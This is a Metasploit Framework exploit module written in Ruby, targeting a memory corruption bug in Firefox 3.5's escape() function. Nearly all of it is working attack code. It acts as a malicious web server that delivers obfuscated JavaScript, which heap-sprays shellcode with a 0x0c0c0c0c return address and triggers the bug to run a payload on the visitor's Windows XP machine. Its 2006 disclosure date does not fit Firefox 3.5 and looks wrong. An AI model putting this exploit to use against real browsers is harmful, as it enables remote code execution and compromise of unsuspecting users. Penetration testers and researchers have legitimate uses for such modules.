##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	#
	# This module acts as an HTTP server
	#
	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Firefox 3.5 escape() Return Value Memory Corruption',
			'Description'    => %q{
				This module exploits a memory corruption vulnerability in the Mozilla
			Firefox browser. This flaw occurs when a bug in the javascript interpreter
			fails to preserve the return value of the escape() function and results in
			uninitialized memory being used instead. This module has only been tested
			on Windows, but should work on other platforms as well with the current
			targets.

			},
			'License'        => MSF_LICENSE,
			'Author'         => [
									'Simon Berry-Byrne <x00050876[at]itnet.ie>',  # Author / Publisher / Original exploit
									'hdm',                                        # Metasploit conversion
								],
			'Version'        => '$Revision$',
			'References'     => 
				[
					['URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=503286'],
				],
			'Payload'        =>
				{
					'Space'    => 1000 + (rand(256).to_i * 4),
					'BadChars' => "\x00",
				},
			'Targets'        =>
				[
					[ 'Firefox 3.5.0 on Windows XP SP0-SP3', 
						{
							'Platform' => 'win',
							'Arch' => ARCH_X86,
							'Ret'  => 0x0c0c0c0c,
						}
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jul 14 2006'
			))

	end

	def on_request_uri(cli, request)

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
		send_response_html(cli, generate_html(p), { 'Content-Type' => 'text/html' })
		handler(cli)
	end
	
	def generate_html(payload)

		enc_code = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
		enc_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(target.arch))
		enc_ret  = Rex::Text.to_unescape(
			Rex::Arch.endian(target.arch) == ENDIAN_LITTLE ? [target.ret].pack('V') : [target.ret].pack('N')
		)
		
		var_data_str1 = Rex::Text.rand_text_alpha(3)
		var_data_str2 = Rex::Text.rand_text_alpha(4)

		js = %Q^

var xunescape = unescape;
var shellcode = xunescape("#{enc_code}");
         
oneblock = xunescape("#{enc_ret}");

var fullblock = oneblock;
while (fullblock.length<0x60000)  
{
    fullblock += fullblock;
}
sprayContainer = new Array();
for (xi=0; xi<600; xi++)  
{
    sprayContainer[xi] = fullblock + shellcode;
}

var searchArray = new Array();
 
function escapeData(data)
{
 var xi;
 var xc;
 var escData='';
 for(xi=0; xi<data.length; xi++)
  {
   xc=data.charAt(xi);
   if(xc=='&' || xc=='?' || xc=='=' || xc=='%' || xc==' ') xc = escape(xc);
   escData+=xc;
  }
 return escData;
}
 
function DataTranslator(){
    searchArray = new Array();
    searchArray[0] = new Array();
    searchArray[0]["#{var_data_str1}"] = "#{var_data_str2}";
    var newElement = document.getElementById("content");
    if (document.getElementsByTagName) {
        var xi=0;
        pTags = newElement.getElementsByTagName("p");
        if (pTags.length > 0)  
        	while (xi < pTags.length)
        	{
            	oTags = pTags[xi].getElementsByTagName("font");
            	searchArray[xi+1] = new Array();
            	if (oTags[0])   {
                	searchArray[xi+1]["#{var_data_str1}"] = oTags[0].innerHTML;
            	}
            	xi++;
        	}
    }
}
 
function GenerateHTML()
{
    var xhtml = "";
    for (xi=1;xi<searchArray.length;xi++)
    {
        xhtml += escapeData(searchArray[xi]["#{var_data_str1}"]);
    }    
}
DataTranslator();
GenerateHTML()	
		^
		# Obfuscate it up a bit
		js = obfuscate_js(js,
			'Symbols' =>  {
				'Variables' => %W{ DataTranslator GenerateHTML escapeData xunescape shellcode oneblock fullblock sprayContainer xi searchArray xc escData xhtml pTags oTags newElement } 
			}
		).to_s
	
		str1 = Rex::Text.rand_text_alpha(20)
		str2 = Rex::Text.rand_text_alpha(24)
		str3 = Rex::Text.rand_text_alpha(10) + "  "
		
		return %Q^
<html>
<head>
<div id="content">
<p>
<FONT>                             
</FONT>
</p>
<p>
<FONT>#{str1}</FONT></p>
<p>
<FONT>#{str2}</FONT>
</p>
<p>
<FONT>#{str3}</FONT>
</p>
</div>
<script language="JavaScript">
#{js}
</script>
</body>
</html>
^


	end

end

